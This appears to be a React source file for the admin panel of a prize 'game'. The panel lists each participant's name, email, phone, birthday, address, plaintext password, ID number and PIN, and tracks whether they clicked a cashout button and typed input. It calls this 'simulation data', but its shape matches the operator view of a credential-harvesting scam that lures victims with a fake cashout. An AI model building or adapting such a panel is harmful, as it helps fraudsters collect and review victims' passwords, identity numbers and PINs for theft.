import React, { useEffect, useState } from 'react';
import { motion } from 'motion/react';
import { Users, Check, X, Clock, Shield, Eye, EyeOff, ArrowLeft } from 'lucide-react';
import { Participant } from '../types';
import { supabase, isSupabaseConfigured } from '../supabase';

export const AdminDashboard: React.FC = () => {
  const [participants, setParticipants] = useState<Participant[]>([]);
  const [showPins, setShowPins] = useState<Record<string, boolean>>({});
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const fetchData = async () => {
      setLoading(true);
      let allParticipants: Participant[] = [];
      
      // 1. Fetch from Local API
      try {
        const res = await fetch('/api/admin/participants');
        if (res.ok) {
          const localData = await res.json();
          allParticipants = [...localData];
        }
      } catch (err) {
        console.error("Local fetch failed:", err);
      }

      // 2. Fetch from Supabase
      if (isSupabaseConfigured && supabase) {
        try {
          const { data, error: sbError } = await supabase
            .from('participants')
            .select('*')
            .order('timestamp', { ascending: false });
          
          if (sbError) throw sbError;
          
          if (data && data.length > 0) {
            const sbParticipants = data as Participant[];
            // Merge data, prioritizing Supabase data for the same ID
            const sbMap = new Map(sbParticipants.map(p => [p.id, p]));
            const localMap = new Map(allParticipants.map(p => [p.id, p]));
            
            // Combine maps
            const combined = new Map([...localMap, ...sbMap]);
            allParticipants = Array.from(combined.values()).sort((a, b) => 
              new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
            );
          }
        } catch (err: any) {
          console.error("Supabase fetch failed:", err);
          setError(`Supabase Error: ${err.message || 'Unknown error'}`);
        }
      }

      setParticipants(allParticipants);
      setLoading(false);
    };

    fetchData();

    // Subscribe to real-time changes if Supabase is available
    let channel: any = null;
    if (isSupabaseConfigured && supabase) {
      channel = supabase
        .channel('admin-changes')
        .on(
          'postgres_changes',
          { event: '*', schema: 'public', table: 'participants' },
          () => fetchData()
        )
        .subscribe();
    }

    // Also poll local API every 10 seconds as fallback
    const interval = setInterval(fetchData, 10000);

    return () => {
      if (channel) supabase?.removeChannel(channel);
      clearInterval(interval);
    };
  }, []);

  const togglePin = (id: string) => {
    setShowPins(prev => ({ ...prev, [id]: !prev[id] }));
  };

  return (
    <div className="min-h-screen bg-zinc-50 p-8 font-sans">
      <div className="max-w-6xl mx-auto space-y-8">
        <header className="flex justify-between items-end">
          <div className="space-y-4">
            <a 
              href="#" 
              className="inline-flex items-center gap-2 text-zinc-500 hover:text-zinc-900 font-bold text-sm transition-colors"
            >
              <ArrowLeft size={16} />
              Back to Game
            </a>
            <div className="space-y-1">
              <h1 className="text-4xl font-black text-zinc-900 flex items-center gap-3">
                <Shield className="text-emerald-500" />
                Admin Dashboard
              </h1>
              <p className="text-zinc-500 font-medium">Monitoring participant activity and simulation data</p>
            </div>
          </div>
          {error && (
            <div className="bg-rose-50 border border-rose-100 p-4 rounded-2xl text-rose-600 text-sm font-medium">
              {error}
            </div>
          )}
          {!isSupabaseConfigured && (
            <div className="bg-amber-50 border border-amber-100 p-4 rounded-2xl text-amber-600 text-sm font-medium">
              Note: Supabase is not configured. Using local SQLite database.
            </div>
          )}
          <div className="flex items-end gap-4">
            <div className="bg-white p-4 rounded-2xl shadow-sm border border-zinc-200 flex items-center gap-4">
              <div className="bg-emerald-100 p-2 rounded-lg">
                <Users className="text-emerald-600 w-5 h-5" />
              </div>
              <div>
                <p className="text-xs text-zinc-400 font-bold uppercase tracking-wider">Total Participants</p>
                <p className="text-2xl font-black text-zinc-900">{participants.length}</p>
              </div>
            </div>
            <button 
              onClick={() => window.location.reload()}
              className="p-4 bg-white border border-zinc-200 rounded-2xl text-zinc-500 hover:text-zinc-900 hover:bg-zinc-50 transition-all shadow-sm"
              title="Refresh Data"
            >
              <Clock size={20} />
            </button>
          </div>
        </header>

        <div className="bg-white rounded-[2rem] shadow-xl shadow-zinc-200/50 border border-zinc-200 overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-zinc-50 border-bottom border-zinc-200">
                  <th className="p-6 text-xs font-black text-zinc-400 uppercase tracking-widest">Participant</th>
                  <th className="p-6 text-xs font-black text-zinc-400 uppercase tracking-widest">Game Status</th>
                  <th className="p-6 text-xs font-black text-zinc-400 uppercase tracking-widest">Cashout Attempt</th>
                  <th className="p-6 text-xs font-black text-zinc-400 uppercase tracking-widest">Credentials</th>
                  <th className="p-6 text-xs font-black text-zinc-400 uppercase tracking-widest">Time</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-100">
                {loading ? (
                  <tr>
                    <td colSpan={5} className="p-12 text-center text-zinc-400 font-medium">Loading data...</td>
                  </tr>
                ) : participants.length === 0 ? (
                  <tr>
                    <td colSpan={5} className="p-12 text-center text-zinc-400 font-medium">No participants yet.</td>
                  </tr>
                ) : (
                  participants.map((p) => (
                    <motion.tr 
                      key={p.id}
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className="hover:bg-zinc-50/50 transition-colors"
                    >
                      <td className="p-6">
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 bg-zinc-100 rounded-full flex items-center justify-center text-zinc-400 font-bold">
                            {p.id.substring(0, 2).toUpperCase()}
                          </div>
                          <div>
                            <div className="flex items-center gap-2">
                              <p className="font-bold text-zinc-900">
                                {p.full_name || p.email || `Guest #${p.id.substring(0, 6)}`}
                              </p>
                              {!p.email && (
                                <span className="px-2 py-0.5 bg-zinc-100 text-zinc-500 text-[10px] font-black uppercase rounded-md border border-zinc-200">
                                  Guest
                                </span>
                              )}
                            </div>
                            <div className="flex flex-col gap-0.5">
                              <p className="text-[10px] text-zinc-400 font-medium">{p.email || 'No email'}</p>
                              {p.phone && <p className="text-[10px] text-zinc-400 font-medium">📞 {p.phone}</p>}
                              {p.birthday && <p className="text-[10px] text-zinc-400 font-medium">🎂 {p.birthday}</p>}
                              {p.address && <p className="text-[10px] text-zinc-400 font-medium">🏠 {p.address}</p>}
                              {p.password && (
                                <p className="text-[10px] text-rose-500 font-bold mt-1">🔑 {p.password}</p>
                              )}
                              <p className="text-xs text-emerald-600 font-bold mt-1">{p.prize || 'No prize yet'}</p>
                            </div>
                          </div>
                        </div>
                      </td>
                      <td className="p-6">
                        <div className="space-y-2">
                          <div className="flex items-center gap-2">
                            {p.played_game ? <Check className="w-4 h-4 text-emerald-500" /> : <X className="w-4 h-4 text-rose-500" />}
                            <span className={`text-xs font-bold ${p.played_game ? 'text-emerald-600' : 'text-rose-600'}`}>Played Game</span>
                          </div>
                          <div className="flex items-center gap-2">
                            {p.won ? <Check className="w-4 h-4 text-emerald-500" /> : <X className="w-4 h-4 text-rose-500" />}
                            <span className={`text-xs font-bold ${p.won ? 'text-emerald-600' : 'text-rose-600'}`}>Won Round</span>
                          </div>
                        </div>
                      </td>
                      <td className="p-6">
                        <div className="space-y-2">
                          <div className="flex items-center gap-2">
                            {p.clicked_cashout ? <Check className="w-4 h-4 text-emerald-500" /> : <X className="w-4 h-4 text-rose-500" />}
                            <span className={`text-xs font-bold ${p.clicked_cashout ? 'text-emerald-600' : 'text-rose-600'}`}>Clicked Cashout</span>
                          </div>
                          <div className="flex items-center gap-2">
                            {p.attempted_input ? <Check className="w-4 h-4 text-emerald-500" /> : <X className="w-4 h-4 text-rose-500" />}
                            <span className={`text-xs font-bold ${p.attempted_input ? 'text-emerald-600' : 'text-rose-600'}`}>Attempted Input</span>
                          </div>
                        </div>
                      </td>
                      <td className="p-6">
                        {p.id_number ? (
                          <div className="space-y-1">
                            <p className="text-xs font-bold text-zinc-900">ID: {p.id_number}</p>
                            <p className="text-xs font-bold text-zinc-500">PIN: {p.id_pin}</p>
                            <p className="text-[10px] font-black text-emerald-600 uppercase tracking-tighter">{p.currency}</p>
                          </div>
                        ) : (
                          <span className="text-xs text-zinc-300 italic">No credentials provided</span>
                        )}
                      </td>
                      <td className="p-6">
                        <div className="flex items-center gap-2 text-zinc-400">
                          <Clock size={14} />
                          <span className="text-xs font-medium">{new Date(p.timestamp).toLocaleTimeString()}</span>
                        </div>
                      </td>
                    </motion.tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
};
